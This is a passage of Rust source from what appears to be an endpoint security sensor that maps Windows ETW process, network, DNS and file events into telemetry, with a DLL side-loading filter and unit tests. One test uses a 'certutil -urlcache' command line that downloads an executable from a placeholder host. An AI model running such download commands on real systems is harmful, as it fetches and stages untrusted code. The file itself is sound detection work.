//! ETW record → TRAPD event mapping (platform-neutral, unit-tested anywhere).
//!
//! The Windows ETW sensor (`collectors::windows::etw`) decodes each event with
//! TDH into an [`EtwRecord`]: provider, event id, header PID/time and the named
//! properties. Everything after that — which provider/event means what, how
//! addresses and ports are laid out, how NT device paths become drive paths —
//! lives here, so it is tested without a Windows kernel.
//!
//! Providers (GUIDs verified against the published manifests):
//!
//! | Provider | GUID | Keywords | Events |
//! |---|---|---|---|
//! | Microsoft-Windows-Kernel-Process | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | `0x10` process, `0x40` image | 1 ProcessStart, 2 ProcessStop, 5 ImageLoad |
//! | Microsoft-Windows-Kernel-Network | `7dd42a49-5329-4832-8dfd-43d979153a88` | `0x10` IPv4, `0x20` IPv6 | 12/28 connect, 15/31 accept |
//! | Microsoft-Windows-DNS-Client | `1c95126e-7eea-49a9-a3fe-a378b03ddb4d` | all | 3008 query completed |
//!
//! Property names differ slightly between Windows builds (`ImageName` vs.
//! `ImageFileName`, `ParentProcessID` vs. `ParentId`); every lookup accepts the
//! known aliases.

use std::collections::{HashMap, VecDeque};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use crate::schema::{
    DnsResolutionData, NetworkConnectionData, ProcessCreateData, ProcessTerminateData,
};

pub const KERNEL_PROCESS: u128 = 0x22fb2cd6_0e7b_422b_a0c7_2fad1fd0e716;
pub const KERNEL_NETWORK: u128 = 0x7dd42a49_5329_4832_8dfd_43d979153a88;
pub const DNS_CLIENT: u128 = 0x1c95126e_7eea_49a9_a3fe_a378b03ddb4d;
/// Microsoft-Windows-Kernel-File. Read by its own session (never the main
/// one): the volume is a file operation per open/write on the whole host.
pub const KERNEL_FILE: u128 = 0xedd08927_9cc4_4e65_b970_c2560fb5c289;

#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_PROCESS_KEYWORDS: u64 = 0x10 | 0x40;
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_NETWORK_KEYWORDS: u64 = 0x10 | 0x20;
/// Kernel-File keywords CREATE (0x80) and WRITE (0x200), from the provider
/// manifest. Not field-verified on a Windows host yet: a wrong value only
/// yields no events, never wrong ones.
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_FILE_KEYWORDS: u64 = 0x80 | 0x200;

/// One decoded property value.
#[derive(Debug, Clone, PartialEq)]
pub enum EtwValue {
    Str(String),
    /// Integer value plus its raw little-endian bytes (ports and IPv4
    /// addresses are stored in network byte order and need the raw form).
    Int(u64, Vec<u8>),
    Bytes(Vec<u8>),
}

/// A decoded ETW event.
#[derive(Debug, Clone, Default)]
pub struct EtwRecord {
    pub provider: u128,
    pub id: u16,
    /// `EVENT_HEADER.ProcessId` — the process that *logged* the event.
    pub header_pid: u32,
    /// `EVENT_HEADER.TimeStamp` as FILETIME ticks.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub timestamp: i64,
    pub props: HashMap<String, EtwValue>,
    /// Process context read in the ETW callback itself, the earliest point
    /// user mode sees a `ProcessStart`. Only set for Kernel-Process event 1.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub captured: Option<ProcessEnrichment>,
}

impl EtwRecord {
    fn get(&self, names: &[&str]) -> Option<&EtwValue> {
        names.iter().find_map(|n| self.props.get(*n))
    }
    pub fn str(&self, names: &[&str]) -> Option<String> {
        match self.get(names)? {
            EtwValue::Str(s) => Some(s.clone()),
            _ => None,
        }
    }
    pub fn int(&self, names: &[&str]) -> Option<u64> {
        match self.get(names)? {
            EtwValue::Int(v, _) => Some(*v),
            _ => None,
        }
    }
    fn raw(&self, names: &[&str]) -> Option<Vec<u8>> {
        match self.get(names)? {
            EtwValue::Int(_, raw) | EtwValue::Bytes(raw) => Some(raw.clone()),
            EtwValue::Str(_) => None,
        }
    }
}

/// ETW session uses system-time ticks (FILETIME), never QPC ticks.
#[cfg_attr(not(windows), allow(dead_code))]
pub fn filetime_timestamp(ticks: i64) -> Option<chrono::DateTime<chrono::Utc>> {
    if ticks <= 0 {
        return None;
    }
    let unix_ticks = ticks.checked_sub(116_444_736_000_000_000)?;
    chrono::DateTime::from_timestamp(
        unix_ticks.div_euclid(10_000_000),
        (unix_ticks.rem_euclid(10_000_000) * 100) as u32,
    )
}

/// NT device prefix → drive, e.g. (`\Device\HarddiskVolume3`, `C:`).
pub type DeviceMap = Vec<(String, String)>;

/// `\Device\HarddiskVolume3\Windows\System32\cmd.exe` → `C:\Windows\…`.
/// Paths already in drive form pass through; unknown devices stay as they are
/// (still useful as evidence, and never mistaken for a drive path).
pub fn device_to_dos(path: &str, devices: &DeviceMap) -> String {
    let path = path.strip_prefix("\\??\\").unwrap_or(path);
    for (device, drive) in devices {
        if path.len() > device.len()
            && path
                .get(..device.len())
                .is_some_and(|p| p.eq_ignore_ascii_case(device))
            && path.as_bytes()[device.len()] == b'\\'
        {
            return format!("{drive}{}", &path[device.len()..]);
        }
    }
    path.to_string()
}

fn basename(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_string()
}

/// What a process start needs from outside the event (looked up while the
/// process is still alive): command line, account and image hash.
#[derive(Debug, Clone, Default)]
pub struct ProcessEnrichment {
    pub exe: Option<String>,
    pub cmdline: Option<String>,
    pub username: Option<String>,
    pub exe_sha256: Option<String>,
    /// Why `exe_sha256` is absent although an image path was known
    /// (oversize / unreadable); recorded in the event's enrichment errors.
    pub exe_sha256_error: Option<crate::telemetry::EnrichmentError>,
}

impl ProcessEnrichment {
    /// Field-wise merge: values already present win, `fallback` fills the
    /// gaps. Empty strings count as missing, so a failed read never masks a
    /// later successful one.
    pub fn prefer_over(self, fallback: ProcessEnrichment) -> ProcessEnrichment {
        fn pick(a: Option<String>, b: Option<String>) -> Option<String> {
            a.filter(|v| !v.is_empty()).or(b.filter(|v| !v.is_empty()))
        }
        let exe_sha256 = pick(self.exe_sha256, fallback.exe_sha256);
        // A failure only matters while no hash was obtained from either side.
        let exe_sha256_error = if exe_sha256.is_some() {
            None
        } else {
            self.exe_sha256_error.or(fallback.exe_sha256_error)
        };
        ProcessEnrichment {
            exe: pick(self.exe, fallback.exe),
            cmdline: pick(self.cmdline, fallback.cmdline),
            username: pick(self.username, fallback.username),
            exe_sha256,
            exe_sha256_error,
        }
    }
}

/// Enrichment is valid only for the generation that produced this source event.
pub fn same_process_generation(start: Option<u64>, current: Option<u64>, observed: i64) -> bool {
    start.is_some_and(|s| s > 0 && current == Some(s) && observed >= 0 && observed as u64 >= s)
}

/// Kernel-Process event 1 → process create.
pub fn process_start(
    rec: &EtwRecord,
    devices: &DeviceMap,
    enrich: ProcessEnrichment,
) -> Option<ProcessCreateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 1 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let ppid = rec
        .int(&["ParentProcessID", "ParentId", "ParentProcessId"])
        .and_then(|p| i32::try_from(p).ok())
        .unwrap_or(0);
    let image = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| device_to_dos(&p, devices))
        .unwrap_or_default();
    let exe = enrich.exe.filter(|e| !e.is_empty()).unwrap_or(image);
    let mut notes = crate::telemetry::Enrichment::new();
    // Source order: the kernel's own payload (authoritative, race-free, when
    // the manifest carries it), then what the callback read at start, then a
    // late lookup. The cap matches the polling collector's contract.
    let from_payload = rec.str(&["CommandLine"]).filter(|c| !c.is_empty());
    let (cmdline, truncation) = crate::telemetry::limits::truncate_str(
        &from_payload.or(enrich.cmdline).unwrap_or_default(),
        crate::telemetry::limits::MAX_CMDLINE_BYTES,
    );
    notes.truncated("cmdline", truncation);
    if cmdline.is_empty() {
        // The process exited before any read could succeed; the start itself
        // is still recorded (Security 4688 can still supply the command line
        // to detection).
        notes.fail("cmdline", crate::telemetry::EnrichmentError::IoError);
    }
    if let Some(cause) = enrich.exe_sha256_error {
        notes.fail("exe_sha256", cause);
    }
    let username = enrich.username.unwrap_or_else(|| "unknown".into());
    if username == "unknown" {
        notes.fail("username", crate::telemetry::EnrichmentError::IoError);
    }
    Some(ProcessCreateData {
        pid,
        ppid,
        name: basename(&exe),
        exe,
        cmdline,
        uid: 0,
        username,
        exe_sha256: enrich.exe_sha256,
        process_start_time: rec.int(&["CreateTime"]).filter(|t| *t > 0),
        parent_start_time: None,
        parent_exe: None,
        enrichment: notes.finish(0),
    })
}

/// Kernel-Process event 2 → process terminate.
pub fn process_stop(rec: &EtwRecord, devices: &DeviceMap) -> Option<ProcessTerminateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 2 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let name = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| basename(&device_to_dos(&p, devices)))
        .unwrap_or_default();
    Some(ProcessTerminateData { pid, name })
}

/// Kernel-Process event 5 → (pid, loaded image path).
pub fn image_load(rec: &EtwRecord, devices: &DeviceMap) -> Option<(i32, String)> {
    if rec.provider != KERNEL_PROCESS || rec.id != 5 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let image = rec.str(&["ImageName", "FileName"])?;
    Some((pid, device_to_dos(&image, devices)))
}

/// A DLL load worth reporting: a process that runs from a protected location
/// loaded a `.dll` from a folder an unprivileged user can write to (the DLL
/// search-order hijack / side-loading shape). This is a volume filter, not a
/// verdict: every DLL load is far too frequent to ship, and judging the
/// candidate happens in the backend. Per-user sync clients legitimately load
/// shell extensions from their own AppData folders and are left out.
pub fn is_side_load_candidate(process_exe: &str, dll: &str) -> bool {
    let dll_l = dll.to_ascii_lowercase().replace('/', "\\");
    if !dll_l.ends_with(".dll") {
        return false;
    }
    let exe_l = process_exe.to_ascii_lowercase().replace('/', "\\");
    let trusted_process = exe_l.contains(":\\windows\\system32\\")
        || exe_l.contains(":\\windows\\syswow64\\")
        || exe_l.contains(":\\program files\\")
        || exe_l.contains(":\\program files (x86)\\");
    let writable = dll_l.contains("\\appdata\\")
        || dll_l.contains("\\users\\public\\")
        || dll_l.contains("\\windows\\temp\\")
        || dll_l.contains("\\temp\\")
        || dll_l.contains("\\downloads\\")
        || dll_l.contains("\\desktop\\")
        || (dll_l.contains(":\\programdata\\") && !dll_l.contains("\\programdata\\microsoft\\"))
        || dll_l.contains("\\$recycle.bin\\");
    const PER_USER_CLIENTS: &[&str] = &[
        "\\appdata\\local\\microsoft\\onedrive\\",
        "\\appdata\\local\\microsoft\\teams\\",
        "\\appdata\\local\\microsoft\\windowsapps\\",
        "\\appdata\\local\\packages\\",
    ];
    trusted_process && writable && !PER_USER_CLIENTS.iter().any(|k| dll_l.contains(k))
}

/// Address property → text. IPv4 arrives as a 4-byte integer in network
/// order, IPv6 as 16 raw bytes.
fn address(rec: &EtwRecord, name: &str) -> Option<String> {
    let raw = rec.raw(&[name])?;
    match raw.len() {
        4 => Some(Ipv4Addr::new(raw[0], raw[1], raw[2], raw[3]).to_string()),
        16 => {
            let mut b = [0u8; 16];
            b.copy_from_slice(&raw);
            Some(Ipv6Addr::from(b).to_string())
        }
        _ => None,
    }
}

/// Port property → host order (stored big-endian on the wire).
fn port(rec: &EtwRecord, name: &str) -> Option<u16> {
    let raw = rec.raw(&[name])?;
    (raw.len() == 2).then(|| u16::from_be_bytes([raw[0], raw[1]]))
}

/// Kernel-Network connect/accept → connection record.
pub fn network_connection(
    rec: &EtwRecord,
    process: Option<String>,
) -> Option<NetworkConnectionData> {
    if rec.provider != KERNEL_NETWORK {
        return None;
    }
    let inbound = match rec.id {
        12 | 28 => false,
        15 | 31 => true,
        _ => return None,
    };
    let pid = rec.int(&["PID"]).and_then(|p| i32::try_from(p).ok());
    let daddr = address(rec, "daddr")?;
    let saddr = address(rec, "saddr")?;
    let dport = port(rec, "dport")?;
    let sport = port(rec, "sport")?;
    let v6 = daddr.contains(':');
    // The provider reports both directions from the local socket's view:
    // `saddr`/`sport` are local for a connect, remote for an accept.
    let (src_addr, src_port, dst_addr, dst_port) = if inbound {
        (daddr, dport, saddr, sport)
    } else {
        (saddr, sport, daddr, dport)
    };
    Some(NetworkConnectionData {
        protocol: if v6 { "tcp6" } else { "tcp" }.into(),
        src_addr,
        src_port,
        dst_addr,
        dst_port,
        state: if inbound { "accepted" } else { "established" }.into(),
        pid,
        process_start_time: None,
        process,
        duration_ms: None,
        bytes_sent: None,
        bytes_recv: None,
        packets_sent: None,
        packets_recv: None,
        rtt_us: None,
    })
}

fn qtype_name(t: u64) -> String {
    match t {
        1 => "A".into(),
        2 => "NS".into(),
        5 => "CNAME".into(),
        6 => "SOA".into(),
        12 => "PTR".into(),
        15 => "MX".into(),
        16 => "TXT".into(),
        28 => "AAAA".into(),
        33 => "SRV".into(),
        65 => "HTTPS".into(),
        255 => "ANY".into(),
        other => format!("TYPE{other}"),
    }
}

/// `QueryStatus` (Win32/DNS error code) → DNS response code text.
///
/// DNS RCODEs surface as `DNS_ERROR_RCODE_*` (9001..9010, windns.h). Statuses
/// that are not a DNS response code (transport errors, `ERROR_INVALID_PARAMETER`
/// = 87, ...) map to `UNKNOWN` rather than leaking a Win32 number into a field
/// whose contract is an RCODE name.
fn rcode(status: u64) -> &'static str {
    match status {
        0 => "NOERROR",
        9001 => "FORMERR",
        9002 => "SERVFAIL",
        9003 => "NXDOMAIN",
        9004 => "NOTIMP",
        9005 => "REFUSED",
        9006 => "YXDOMAIN",
        9007 => "YXRRSET",
        9008 => "NXRRSET",
        9009 => "NOTAUTH",
        9010 => "NOTZONE",
        // DNS_INFO_NO_RECORDS / DNS_ERROR_RECORD_DOES_NOT_EXIST: the name
        // resolved but holds no record of the requested type (NODATA).
        9501 | 9701 => "NODATA",
        // ERROR_TIMEOUT / DNS timeout / WSAETIMEDOUT.
        258 | 1460 | 10060 => "TIMEOUT",
        _ => "UNKNOWN",
    }
}

/// Parses the `QueryResults` text of DNS-Client events, e.g.
/// `"10.0.0.5;::ffff:10.0.0.5;type:  5 cdn.example;type:  6 ns1.example admin.example 1 900 ...;"`.
///
/// Only address entries and CNAME (type 5) entries belong to the answer.
/// Other `type:` entries (SOA 6, NS 2, ...) are authority records of a
/// negative response and must not be reported as aliases.
fn parse_query_results(text: &str) -> (Vec<String>, Vec<String>) {
    let (mut ips, mut cnames) = (Vec::new(), Vec::new());
    for part in text.split(';') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(rest) = part.strip_prefix("type:") {
            let mut fields = rest.split_whitespace();
            if fields.next() == Some("5") {
                if let Some(name) = fields.next() {
                    cnames.push(name.trim_end_matches('.').to_string());
                }
            }
        } else if part.parse::<std::net::IpAddr>().is_ok() {
            let ip = part.strip_prefix("::ffff:").unwrap_or(part).to_string();
            if !ips.contains(&ip) {
                ips.push(ip);
            }
        }
    }
    (ips, cnames)
}

/// DNS-Client event 3008 (query completed) → resolution record. Returns the
/// PID that logged the event alongside; the DNS-Client library runs in the
/// querying process, so this is the requester unless it is the Dnscache
/// service host (shared-cache lookups).
pub fn dns_query(rec: &EtwRecord) -> Option<(u32, DnsResolutionData)> {
    if rec.provider != DNS_CLIENT || rec.id != 3008 {
        return None;
    }
    let qname = rec.str(&["QueryName"])?.trim_end_matches('.').to_string();
    if qname.is_empty() {
        return None;
    }
    let qtype = qtype_name(rec.int(&["QueryType"]).unwrap_or(0));
    let status = rec.int(&["QueryStatus", "Status"]).unwrap_or(0);
    let (ips, cnames) = parse_query_results(&rec.str(&["QueryResults"]).unwrap_or_default());
    Some((
        rec.header_pid,
        DnsResolutionData {
            qname,
            qtype,
            resolved_ips: ips,
            cnames,
            // The provider delivers neither client address nor transaction id;
            // the server comes from `dns_server_hint`, never from here.
            server_addr: String::new(),
            client_addr: String::new(),
            transaction_id: 0,
            rcode: rcode(status).to_string(),
            query_status: u32::try_from(status).ok(),
            pid: None,
            process: None,
            process_start_time: None,
        },
    ))
}

/// DNS-Client events that name the server a query was sent to (3009 network
/// query initiated, 3010 query sent, 3011 response received) →
/// `(lower-case query name, query type, server address)`. Only a value that
/// parses as an IP address is accepted.
pub fn dns_server_hint(rec: &EtwRecord) -> Option<(String, u64, String)> {
    if rec.provider != DNS_CLIENT || !matches!(rec.id, 3009..=3011) {
        return None;
    }
    let qname = rec
        .str(&["QueryName"])?
        .trim_end_matches('.')
        .to_ascii_lowercase();
    if qname.is_empty() {
        return None;
    }
    let server = rec.str(&["DnsServerIpAddress", "DnsServerAddress"])?;
    let server = server.trim().trim_matches(|c| c == '[' || c == ']');
    let ip: IpAddr = server.parse().ok()?;
    Some((qname, rec.int(&["QueryType"]).unwrap_or(0), ip.to_string()))
}

/// How long a server hint may precede the completion event it belongs to.
const DNS_HINT_TTL_TICKS: i64 = 30 * 10_000_000;
const DNS_HINT_MAX: usize = 1024;

/// Bounded `(name, type)` → server memory joining the "query sent" events to
/// the completion event. A hint only decorates an event that is emitted
/// anyway, so overflowing it loses a field, not an event.
#[derive(Default)]
pub struct DnsServerHints {
    map: HashMap<(String, u64), (String, i64)>,
    order: VecDeque<(String, u64)>,
}

impl DnsServerHints {
    pub fn note(&mut self, rec: &EtwRecord) {
        let Some((name, qtype, server)) = dns_server_hint(rec) else {
            return;
        };
        let key = (name, qtype);
        if self
            .map
            .insert(key.clone(), (server, rec.timestamp))
            .is_none()
        {
            self.order.push_back(key);
        }
        while self.map.len() > DNS_HINT_MAX {
            match self.order.pop_front() {
                Some(old) => {
                    self.map.remove(&old);
                }
                None => break,
            }
        }
    }

    /// Server for a completion event, when one was seen shortly before it.
    pub fn take(&mut self, qname: &str, qtype: u64, completed: i64) -> Option<String> {
        let (server, at) = self.map.remove(&(qname.to_ascii_lowercase(), qtype))?;
        (completed >= at && completed - at <= DNS_HINT_TTL_TICKS).then_some(server)
    }
}

/// Process that issued a file create/overwrite or write (Kernel-File).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileTouch {
    pub pid: i32,
    pub path: String,
}

const FILE_OBJECTS_MAX: usize = 8192;
const TOUCH_INTERVAL_TICKS: i64 = 10_000_000;
/// `FILE_DIRECTORY_FILE` in `CreateOptions`.
const FILE_DIRECTORY_FILE: u64 = 0x1;

/// FileObject → path for open handles, filled by Create and read by Write
/// (a Write event carries no name). Bounded; cleared when full, so at worst
/// writes to files opened before the clear are not attributed.
#[derive(Default)]
pub struct FileObjects {
    /// FileObject → (path, FILETIME of the last touch reported).
    paths: HashMap<u64, (String, Option<i64>)>,
    /// Times the table was cleared at its bound (attribution lost, no event).
    pub overflows: u64,
}

impl FileObjects {
    /// Kernel-File Create (12) / Cleanup (13) / Close (14) / Write (16) → the
    /// touch it proves. A create counts only when its disposition creates or
    /// truncates (`FILE_SUPERSEDE`, `FILE_CREATE`, `FILE_OVERWRITE`,
    /// `FILE_OVERWRITE_IF`); opening an existing file proves nothing.
    /// `header_pid` is the issuing process of the operation.
    pub fn observe(&mut self, rec: &EtwRecord, devices: &DeviceMap) -> Option<FileTouch> {
        if rec.provider != KERNEL_FILE {
            return None;
        }
        let object = rec.int(&["FileObject"])?;
        let pid = i32::try_from(rec.header_pid).ok().filter(|p| *p > 0)?;
        match rec.id {
            12 => {
                let name = rec.str(&["FileName"]).filter(|n| !n.is_empty())?;
                let options = rec.int(&["CreateOptions"]).unwrap_or(0);
                if options & FILE_DIRECTORY_FILE != 0 {
                    return None;
                }
                let path = device_to_dos(&name, devices);
                if self.paths.len() >= FILE_OBJECTS_MAX {
                    self.paths.clear();
                    self.overflows += 1;
                }
                let creates = matches!((options >> 24) & 0xff, 0 | 2 | 4 | 5);
                self.paths
                    .insert(object, (path.clone(), creates.then_some(rec.timestamp)));
                creates.then_some(FileTouch { pid, path })
            }
            13 | 14 => {
                self.paths.remove(&object);
                None
            }
            // One report per open file per second: a bulk write is one
            // attribution, not thousands of identity look-ups.
            16 => {
                let (path, last) = self.paths.get_mut(&object)?;
                if last.is_some_and(|t| rec.timestamp.saturating_sub(t) < TOUCH_INTERVAL_TICKS) {
                    return None;
                }
                *last = Some(rec.timestamp);
                Some(FileTouch {
                    pid,
                    path: path.clone(),
                })
            }
            _ => None,
        }
    }
}

/// Network flows tracked for byte accounting.
const FLOWS_MAX: usize = 8192;

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct FlowKey {
    pid: i32,
    /// The two endpoints in a fixed order: the provider does not use one
    /// orientation for every event of an accepted connection.
    ends: ((String, u16), (String, u16)),
}

struct Flow {
    data: NetworkConnectionData,
    first_ts: i64,
    sent: u64,
    recv: u64,
}

/// Per-connection byte totals from Kernel-Network send/receive events, emitted
/// as one `closed` record when the connection ends. Bounded by [`FLOWS_MAX`];
/// the oldest flow is flushed as an `open` snapshot instead of dropped.
/// Only TCP flows whose connect/accept was observed are tracked, so a
/// connection that predates the session reports no bytes rather than wrong
/// ones.
#[derive(Default)]
pub struct NetFlows {
    flows: HashMap<FlowKey, Flow>,
    order: VecDeque<FlowKey>,
    /// Traffic for connections never seen opening (no totals emitted).
    pub untracked: u64,
}

fn flow_key(pid: i32, a: (String, u16), b: (String, u16)) -> FlowKey {
    let ends = if a <= b { (a, b) } else { (b, a) };
    FlowKey { pid, ends }
}

fn record_key(rec: &EtwRecord) -> Option<FlowKey> {
    let pid = i32::try_from(rec.int(&["PID"])?).ok()?;
    Some(flow_key(
        pid,
        (address(rec, "saddr")?, port(rec, "sport")?),
        (address(rec, "daddr")?, port(rec, "dport")?),
    ))
}

impl NetFlows {
    /// Start tracking a flow from its connect/accept record (already mapped).
    /// Returns the snapshot of a flow evicted to make room, if any.
    pub fn open(&mut self, data: &NetworkConnectionData, ts: i64) -> Option<NetworkConnectionData> {
        let pid = data.pid?;
        let key = flow_key(
            pid,
            (data.src_addr.clone(), data.src_port),
            (data.dst_addr.clone(), data.dst_port),
        );
        let flow = Flow {
            data: data.clone(),
            first_ts: ts,
            sent: 0,
            recv: 0,
        };
        let mut evicted = None;
        if !self.flows.contains_key(&key) {
            while self.flows.len() >= FLOWS_MAX {
                let Some(old) = self.order.pop_front() else {
                    break;
                };
                if let Some(f) = self.flows.remove(&old) {
                    evicted = Some(f.finish("open", ts));
                }
            }
            self.order.push_back(key.clone());
        }
        self.flows.insert(key, flow);
        evicted
    }

    /// Fold a Kernel-Network send (10/26), receive (11/27) or disconnect
    /// (13/29) record in. Returns the `closed` record on disconnect.
    pub fn observe(&mut self, rec: &EtwRecord) -> Option<NetworkConnectionData> {
        if rec.provider != KERNEL_NETWORK {
            return None;
        }
        let (sending, receiving, closing) = match rec.id {
            10 | 26 => (true, false, false),
            11 | 27 => (false, true, false),
            13 | 29 => (false, false, true),
            _ => return None,
        };
        let key = record_key(rec)?;
        let Some(flow) = self.flows.get_mut(&key) else {
            self.untracked += 1;
            return None;
        };
        let size = rec.int(&["size"]).unwrap_or(0);
        if sending {
            flow.sent = flow.sent.saturating_add(size);
        } else if receiving {
            flow.recv = flow.recv.saturating_add(size);
        }
        if !closing {
            return None;
        }
        let flow = self.flows.remove(&key)?;
        self.order.retain(|k| k != &key);
        Some(flow.finish("closed", rec.timestamp))
    }
}

impl Flow {
    fn finish(self, state: &str, ts: i64) -> NetworkConnectionData {
        let mut data = self.data;
        data.state = state.into();
        data.bytes_sent = Some(self.sent);
        data.bytes_recv = Some(self.recv);
        if ts >= self.first_ts && self.first_ts > 0 {
            data.duration_ms = Some(((ts - self.first_ts) / 10_000) as u64);
        }
        data
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn side_load_candidates_are_protected_process_plus_writable_dll() {
        let sys = r"C:\Windows\System32\svchost.exe";
        assert!(is_side_load_candidate(
            sys,
            r"C:\Users\a\AppData\Roaming\x\version.dll"
        ));
        assert!(is_side_load_candidate(sys, r"C:\Users\Public\wlbsctrl.DLL"));
        assert!(is_side_load_candidate(
            r"C:\Program Files\App\app.exe",
            r"C:\ProgramData\evil\a.dll"
        ));
        // a protected location for the DLL, or not a DLL, is ordinary
        assert!(!is_side_load_candidate(
            sys,
            r"C:\Windows\System32\kernel32.dll"
        ));
        assert!(!is_side_load_candidate(
            sys,
            r"C:\Users\a\AppData\Roaming\x\data.bin"
        ));
        // per-user apps live and load from AppData
        assert!(!is_side_load_candidate(
            r"C:\Users\a\AppData\Local\app\app.exe",
            r"C:\Users\a\AppData\Local\app\lib.dll"
        ));
        // known per-user sync clients' shell extensions, and Microsoft's ProgramData
        assert!(!is_side_load_candidate(
            r"C:\Windows\System32\explorer.exe",
            r"C:\Users\a\AppData\Local\Microsoft\OneDrive\24.1\FileSyncShell64.dll"
        ));
        assert!(!is_side_load_candidate(
            sys,
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\x.dll"
        ));
    }

    fn rec(provider: u128, id: u16, props: &[(&str, EtwValue)]) -> EtwRecord {
        EtwRecord {
            provider,
            id,
            header_pid: 4,
            timestamp: 0,
            props: props
                .iter()
                .map(|(k, v)| (k.to_string(), v.clone()))
                .collect(),
            captured: None,
        }
    }
    fn int(v: u64, width: usize) -> EtwValue {
        EtwValue::Int(v, v.to_le_bytes()[..width].to_vec())
    }
    fn s(v: &str) -> EtwValue {
        EtwValue::Str(v.into())
    }

    fn devices() -> DeviceMap {
        vec![
            ("\\Device\\HarddiskVolume3".into(), "C:".into()),
            ("\\Device\\HarddiskVolume10".into(), "D:".into()),
        ]
    }

    #[test]
    fn reused_pid_and_old_records_are_not_enriched() {
        assert!(same_process_generation(Some(100), Some(100), 120));
        assert!(!same_process_generation(Some(100), Some(200), 120));
        assert!(!same_process_generation(Some(100), Some(100), 90));
        assert!(!same_process_generation(None, Some(100), 120));
        assert!(!same_process_generation(Some(100), None, 120));
    }

    #[test]
    fn event_filetime_keeps_sensor_time_and_unicode_device_paths_do_not_panic() {
        assert_eq!(
            filetime_timestamp(116_444_736_000_000_000)
                .unwrap()
                .timestamp(),
            0
        );
        assert!(filetime_timestamp(0).is_none());
        assert_eq!(
            device_to_dos("aéabc", &vec![("ab".into(), "C:".into())]),
            "aéabc"
        );
    }

    #[test]
    fn device_paths_map_to_drives() {
        let d = devices();
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", &d),
            "C:\\Windows\\System32\\cmd.exe"
        );
        // Volume3 must not match Volume30 / the Volume10 prefix of another.
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume10\\x.exe", &d),
            "D:\\x.exe"
        );
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume30\\x.exe", &d),
            "\\Device\\HarddiskVolume30\\x.exe"
        );
        assert_eq!(device_to_dos("\\??\\C:\\x.exe", &d), "C:\\x.exe");
        assert_eq!(device_to_dos("C:\\x.exe", &d), "C:\\x.exe");
    }

    #[test]
    fn process_start_uses_enrichment_and_survives_without_it() {
        let r = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessID", int(4242, 4)),
                ("ParentProcessID", int(1000, 4)),
                ("CreateTime", int(133_000_000_000_000_000, 8)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe"),
                ),
            ],
        );
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("certutil -urlcache -f http://x/a.exe a.exe".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!((p.pid, p.ppid), (4242, 1000));
        assert_eq!(p.exe, "C:\\Windows\\System32\\certutil.exe");
        assert_eq!(p.name, "certutil.exe");
        assert_eq!(p.process_start_time, Some(133_000_000_000_000_000));
        assert_eq!(p.username, "CORP\\anna");

        // A process gone before enrichment still yields an event.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty());
        assert_eq!(p.username, "unknown");

        // An image that could not be hashed is recorded, not silently omitted.
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("x".into()),
                exe_sha256_error: Some(crate::telemetry::EnrichmentError::Unsupported),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(p.exe_sha256.is_none());
        assert_eq!(
            p.enrichment.enrichment_errors["exe_sha256"],
            crate::telemetry::EnrichmentError::Unsupported
        );

        // Aliases of older builds.
        let old = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessId", int(7, 4)),
                ("ParentId", int(6, 4)),
                ("ImageFileName", s("C:\\a.exe")),
            ],
        );
        assert_eq!(
            process_start(&old, &devices(), ProcessEnrichment::default())
                .unwrap()
                .ppid,
            6
        );
        assert!(process_start(
            &rec(KERNEL_NETWORK, 1, &[]),
            &devices(),
            ProcessEnrichment::default()
        )
        .is_none());
    }

    #[test]
    fn process_stop_and_image_load() {
        let stop = rec(
            KERNEL_PROCESS,
            2,
            &[
                ("ProcessID", int(9, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\x\\y.exe")),
            ],
        );
        assert_eq!(process_stop(&stop, &devices()).unwrap().name, "y.exe");
        let load = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(9, 4)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Users\\a\\AppData\\x.dll"),
                ),
            ],
        );
        assert_eq!(
            image_load(&load, &devices()).unwrap(),
            (9, "C:\\Users\\a\\AppData\\x.dll".to_string())
        );
    }

    #[test]
    fn network_connect_decodes_network_order() {
        // 10.20.0.5:443 ← 10.20.0.50:51000, as the provider stores them.
        let r = rec(
            KERNEL_NETWORK,
            12,
            &[
                ("PID", int(1234, 4)),
                ("daddr", EtwValue::Int(0, vec![10, 20, 0, 5])),
                ("saddr", EtwValue::Int(0, vec![10, 20, 0, 50])),
                ("dport", EtwValue::Int(0, 443u16.to_be_bytes().to_vec())),
